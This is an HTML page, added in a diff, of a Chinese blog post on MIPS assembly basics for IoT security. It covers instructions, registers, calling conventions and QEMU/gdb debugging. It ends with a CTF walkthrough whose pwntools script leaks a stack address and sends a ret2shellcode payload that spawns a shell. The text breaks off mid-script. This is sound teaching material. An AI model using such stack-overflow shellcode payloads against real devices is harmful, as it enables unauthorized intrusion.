@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>IOT安全入门学习--MIPS汇编基础 | ZIKH26's Blog</title><meta name="keywords" content="MIPS架构"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="写在前面说下学习 MIPS 汇编基础的思路，作为一个接触新知识面的小白，我首先去查了一下如何编译 MIPS 架构的程序，然后自己写了一个简单的代码，放入 IDA 后开始进行汇编代码的学习，遇见一条指令就学习一条指令，为了观察更细致的内存变化同时还要学习如何用 gdb 来进行 MIPS 架构程序的调试。在这个过程中记录见到的汇编指令和寄存器等等，接着是函数调用约定的学习，参考着网上的文章再结合 gd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT安全入门学习--MIPS汇编基础">
+<meta property="og:url" content="https://zikh26.github.io/posts/919c29c4.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="写在前面说下学习 MIPS 汇编基础的思路，作为一个接触新知识面的小白，我首先去查了一下如何编译 MIPS 架构的程序，然后自己写了一个简单的代码，放入 IDA 后开始进行汇编代码的学习，遇见一条指令就学习一条指令，为了观察更细致的内存变化同时还要学习如何用 gdb 来进行 MIPS 架构程序的调试。在这个过程中记录见到的汇编指令和寄存器等等，接着是函数调用约定的学习，参考着网上的文章再结合 gd">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/img/24.jpg">
+<meta property="article:published_time" content="2023-05-15T07:51:54.338Z">
+<meta property="article:modified_time" content="2023-05-15T08:20:46.727Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="MIPS架构">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/img/24.jpg"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/919c29c4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'IOT安全入门学习--MIPS汇编基础',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-15 16:20:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">99</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/24.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IOT安全入门学习--MIPS汇编基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-15T07:51:54.338Z" title="发表于 2023-05-15 15:51:54">2023-05-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-15T08:20:46.727Z" title="更新于 2023-05-15 16:20:46">2023-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT%E5%AE%89%E5%85%A8/">IOT安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/919c29c4.html" data-flag-title="IOT安全入门学习--MIPS汇编基础"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>说下学习 <code>MIPS</code> 汇编基础的思路，作为一个接触新知识面的小白，我首先去查了一下如何编译 <code>MIPS</code> 架构的程序，然后自己写了一个简单的代码，放入 <code>IDA</code> 后开始进行汇编代码的学习，遇见一条指令就学习一条指令，为了观察更细致的内存变化同时还要学习如何用 <code>gdb</code> 来进行 <code>MIPS</code> 架构程序的调试。在这个过程中记录见到的汇编指令和寄存器等等，接着是函数调用约定的学习，参考着网上的文章再结合 <code>gdb</code> 调试基本就能理解透彻。感觉对 <code>MIPS</code> 汇编基础和函数调用约定已经得心应手，就可以做一些 <code>PWN</code> 题以此来稳固打下的基础，最后尝试来手写各种的 <code>shellcode</code>。希望这个思路能给之后自学者一点借鉴。</p>
+<p>下面先让我们编译运行自己的第一个 <code>MIPS</code> 架构的程序</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> value=a+b;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c=sum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value ==&gt; %d\n&quot;</span>,c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动与调试"><a href="#启动与调试" class="headerlink" title="启动与调试"></a>启动与调试</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>如果是小端序的程序使用 <code>qemu-mipsel ./xxx</code> 运行程序，如果是大端序的程序用 <code>qemu-mips ./xxx</code> 运行程序 </p>
+<p>补充：</p>
+<ol>
+<li>如果运行动态链接的程序，可能会遇见一些报错， 这里的 <a href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99">解决方法</a> 或许会对你有所帮助</li>
+<li>使用 <code>readelf -h xxx</code> 可以查看程序的字节序</li>
+</ol>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试分为 <strong>直接调试程序</strong>  和 <strong>加载进程调试</strong></p>
+<h5 id="直接调试程序"><a href="#直接调试程序" class="headerlink" title="直接调试程序"></a>直接调试程序</h5><p>假设要调试的程序叫做 <code>demo</code> （大端序），那么在终端执行 <code>qemu-mips -g 1234 ./demo</code></p>
+<p>然后再开一个终端执行下面的命令（<code>set endian big</code> 这里是设置为大端序，如果是小端序的话设置为 <code>little</code> ，如果想加载程序符号表的话，再添加一个 <code>symbol-file ./demo</code>） </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture mips</span><br><span class="line">set endian big</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>实际调试情况如下图，如此就可以进入到 <code>gdb</code> 的调试界面了</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112120319.png" alt="image-20230511212044987"></p>
+<p>如果感觉每次都要敲这几条命令有点麻烦的话，可以编写一个 <code>shell</code> 脚本来简化工作，比如我们创建一个叫做 <code>loader.sh</code> 脚本，编写内容如下（纯属举例，具体情况具体处理）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./pwn2</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>然后我们只需要执行 <code>gdb-multiarch</code> 后，执行一次 <code>source loader.sh </code> 命令即可。</p>
+<h5 id="加载进程调试"><a href="#加载进程调试" class="headerlink" title="加载进程调试"></a>加载进程调试</h5><p>这个通常用于我们编写攻击脚本后，需要进行调试判断数据是否是预期的那样。</p>
+<p>只需要在 <code>EXP</code> 中编写代码 <code>p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./demo&quot;])</code> 即可，这其实传入进去的就是一个命令包括参数列表。正常运行程序也是同理 <code>p=process([&quot;qemu-mips&quot;,&quot;./demo&quot;])</code></p>
+<p>剩下的依旧是新开一个终端执行 <code>gdb-multiarch</code> 命令等等（同上）</p>
+<h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><code>li</code> (Load Immediate)指令用于将一个立即数存入一个通用寄存器,	<code>li   $gp, 0x498300</code> 将 <code>$gp</code> 寄存器的值赋值为 <code>0x498300</code></p>
+<p><code>lui</code> 指令将一个 <code>16</code> 位的立即数左移 <code>16</code> 位后存入目标寄存器中， <code>lui   $v0, 0x46</code> 是将 <code>0x46</code> 立即数左移  <code>16</code> 位后存入 <code>$v0</code> 寄存器，即 <code>$v0</code> 寄存器的值为 <code>0x460000</code></p>
+<p><code>ori</code> 指令是 <code>MIPS</code> 汇编中的一种逻辑运算指令，它可以将一个寄存器的低 16 位与一个 16 位的立即数按位或运算，并将结果存入另一个寄存器中。<code>ori $t6,$t6,0x430a</code> 指令将 <code>t6</code> 寄存器与 <code>0x430a</code> 立即数进行或运算，将结果放回 <code>$t6</code></p>
+<p><code>la</code> (Load Address) 指令用于将一个地址或标签存入一个寄存器，<code>la $v0, puts</code> 指令将 <code>puts</code> 函数地址存入 <code>$v0</code> 寄存器中</p>
+<p><code>lw</code> (Load Word) 指令用于<strong>从一个指定的地址加载一个 <code>word</code> 类型的值</strong>到一个寄存器     <code>lw $v0, 0x14($fp)</code> 将 <code>$fp+0x14</code> 的位置中的数据存入到 <code>v0</code> 中</p>
+<p><code>sw</code> (Store Word) 将源寄存器中的值存入指定地址，<code>sw   $ra, 0x24($sp) </code> 将 <code>$ra</code> 的值写入距离栈顶（<code>$sp</code>）偏移 <code>0x24</code> 的内存单元中</p>
+<p><code>move</code> 指令用于寄存器之间值的传递，<code>move   $t5,$t1</code> 将 <code>$t1</code> 赋值给 <code>$5</code> </p>
+<p><code>addi</code> 指令用于计算一个寄存器加上一个立即数，<code>addi $t0,$t1,5</code> 将 <code>$t1</code> 加上 <code>5</code> 之后将结果放为 <code>$t0</code></p>
+<p><code>addu</code> 指令用于计算无符号数之间进行的加法操作，<code>addu $t0,$t1,$t2</code> 将 <code>$t1</code> 和 <code>$t2</code> 进行无符号相加，结果存储在 <code>$t0</code></p>
+<p><code>add</code> 指令和 <code>addu</code> 一样，只不过进行的是有符号数之间的加法。</p>
+<p><code>addiu</code> 指令将上面的 <code>addi</code> 和 <code>addu</code> 结合了一下，<code> addiu  $a1, $zero, 2</code> 进行的是将寄存器<code>$zero</code> 加上一个立即无符号数 <code>2</code> ，并将结果存回寄存器 <code>$a1</code> 中</p>
+<p><code>jr</code> 是跳转指令，<code>jar $ra</code> 跳转到 <code>$ra</code> 寄存器指向的地址处</p>
+<p><code>jal</code> 指令是跳转指令，<code>jal target</code> 复制当前的 <code>PC</code> 值到 <code>$ra</code> 寄存器，然后跳转到 <code>target</code> 处</p>
+<p><code>bnez</code> 指令用于在寄存器的值不为零时进行分支跳转，<code>bnez   $v0, loc_4005E8</code> 表示当 <code>$v0</code> 不为零时跳转到 <code>0x4005E8</code> </p>
+<p><code>b</code> 是无条件跳转指令，<code>b loc_400604</code>  直接跳转到 <code>0x400604</code> 地址处</p>
+<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>在 <code>MIPS</code> 体系结构中有 <code>32</code> 个通用寄存器，在汇编程序中可以用编号 <code>$0-$31</code>表示，也可以用寄存器的名字表示</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305111218207.png" alt="image-20230511121821077" style="zoom:50%;" />
+
+
+
+<h4 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h4><p><code>MIPS</code> 架构中定义了 <code>3</code> 个特殊的寄存器，分别是 <code>PC</code>（程序计数器）、<code>HI</code> (乘除结果高位寄存器)、<code>LO</code>（乘除结果低位寄存器）。在进行乘法运算时， <code>HI</code> 和 <code>LO</code> 保存乘法的运算结果，其中 <code>HI</code> 存储高 <code>32</code> 位，<code>LO</code> 存储低 <code>32</code> 位；在进行除法运算时， <code>HI</code> 保存余数， <code>LO</code> 存储商。</p>
+<h3 id="MIPS32-架构知识"><a href="#MIPS32-架构知识" class="headerlink" title="MIPS32 架构知识"></a><code>MIPS32</code> 架构知识</h3><ul>
+<li><p><code>MIPS</code> 固定 <code>4</code> 字节指令长度 </p>
+</li>
+<li><p>栈是从内存的高地址向低地址方向增长的</p>
+</li>
+<li><p>叶子函数：函数内部没有再调用其他函数</p>
+</li>
+<li><p>非叶子函数：函数内部调用其他函数的函数</p>
+</li>
+<li><p>流水线效应：在分析 <code>MIPS</code> 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （如下图），这是因为 <code>MIPS</code> 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong><code>MIPS</code> 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p>
+</li>
+<li><p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p>
+</li>
+</ul>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305102022075.png" alt="image-20230510202231987"></p>
+<h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305110732606.png" alt="image-20230511073238845" style="zoom:50%;" />
+
+
+
+<p>函数调用时传参：如果函数的参数小于等于四个，那么会使用 <code>$a0 ~ $a3</code> 寄存器来存放参数。如果参数多于四个，那么多于的参数则存放到栈里（同时也会预留出前四个参数的内存空间，因为被调用者使用前四个参数时，会统一将参数放到保留的栈空间），具体情况是函数 <code>A</code> 调用函数 <code>B</code> ，调用者函数（函数<code>A</code> ）会在自己的栈顶预留一部分空间来保存被调用者（函数 <code>B</code> ）的参数，称之为调用参数空间（如下）</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092258483.png" alt="image-20230509225831965" style="zoom:50%;" />
+
+
+
+<p>函数 <code>A</code> 调用函数 <code>B</code>。如果 <code>B</code> 是叶子函数，那么在调用 <code>B</code> 函数时，会将 <code>B</code> 函数的返回地址存入 <code>$ra</code> 寄存器；如果 <code>B</code> 是非叶子函数（<code>B</code> 函数内部调用了一个 <code>C</code> 函数），那么在跳转到 <code>B</code> 函数时，会将其返回地址先存入 <code>$ra</code> 寄存器中，随后在 <code>B</code> 函数内部再将 <code>$ra</code> 寄存器的值存入栈中（位于 <code>fp-0x4</code> 的位置，如下图）。当 <code>B</code> 函数调用 <code>C</code> 函数时，会将其返回地址存入 <code>$ra</code> 寄存器，在返回时执行 <code>jr $ra</code> 指令回到 <code>B</code> 函数。现在假设 <code>B</code> 函数已经执行完毕准备返回到 <code>A</code> 函数，会将原先存入栈里的返回地址读到 <code>$ra</code> 寄存器中，最后执行 <code>jr $ra</code> 指令，回到 <code>A</code> 函数</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092257102.png" alt="image-20230509225747069" style="zoom:50%;" />
+
+
+
+<h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112102666.png" alt="image-20230511210201613"></p>
+<p>发现保护全关，并且是小端序</p>
+<h5 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h5><p>尝试用 <code>qemu-mipsel ./pwn2</code> 运行时发现如下报错</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel: Could not open &#x27;/lib/ld-uClibc.so.0&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>这表明在 <code>/lib</code> 目录下缺少 <code>ld-uClibc.so.0</code> 文件，我们使用 <code>file pwn2</code> 来查看一下文件信息（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112045280.png" alt="image-20230511204507118"></p>
+<p>发现动态链接器的路径是 <code>/lib/ld-uClibc.so.0</code> ，而在这个位置没有找到 <code>ld-uClibc.so.0</code> ，我们使用 <code>sudo find / -name &quot;ld-uClibc.so.0&quot; 2&gt;/dev/null</code> 命令搜索一下，发现是有这个  <code>ld-uClibc.so.0</code> 文件的，只不过不在 <code>/lib</code> 目录下（如下图）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112049318.png" alt="image-20230511204913250"></p>
+<p>因此创建一个软链接过去即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/ld-uClibc.so.0 /lib/</span><br></pre></td></tr></table></figure>
+
+<p>然后我们尝试再次运行 <code>pwn2</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel ./pwn2                                   </span><br><span class="line">./pwn2: can&#x27;t load library &#x27;libc.so.0&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这表明现在还缺少一个 <code>libc.so.0</code> 的库，我们使用 <code>ls /home/zikh/Desktop/mipsel-linux-uclibc/lib/</code> 命令，发现是有 <code>libc.so.0</code> 这个库的（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112028607.png" alt="image-20230511202846472"></p>
+<p>因此我们依然给软链接到 <code>/lib</code> 目录下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/libc.so.0 /lib/ </span><br></pre></td></tr></table></figure>
+
+<p>此时程序可以运行成功（如下图）</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112030731.png" alt="image-20230511203036662" style="zoom:50%;" />
+
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112143512.png" alt="image-20230511214356466" style="zoom:50%;" />
+
+<p>首先这里有一个 <code>read</code> 输入，随后 <code>printf</code> 函数是使用了 <code>%s</code> 将数据进行打印，在这里怀疑可能有机会泄露一些数据，我们通过调试验证一下（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112146239.png" alt="image-20230511214644840"></p>
+<p>发现写入 <code>0x14</code> 字节的数据，确实可以顺带打印出来一个栈地址</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112147526.png" alt="image-20230511214754487"></p>
+<p>随后发现 <code>vuln</code> 函数存在栈溢出漏洞（如上）</p>
+<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为有了栈地址，并且栈区是有可执行的权限，所以打一个常规的 <code>ret2shellcode</code></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120729296.png" alt="image-20230512072926146"></p>
+<p>如上图所示，发现本地是通了的，因此思路没有任何问题，<code>EXP</code> 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25419)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*offset)</span><br><span class="line">stack_addr=u32(p.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x24</span>+p32(stack_addr-<span class="number">0x50</span>)+shellcode</span><br><span 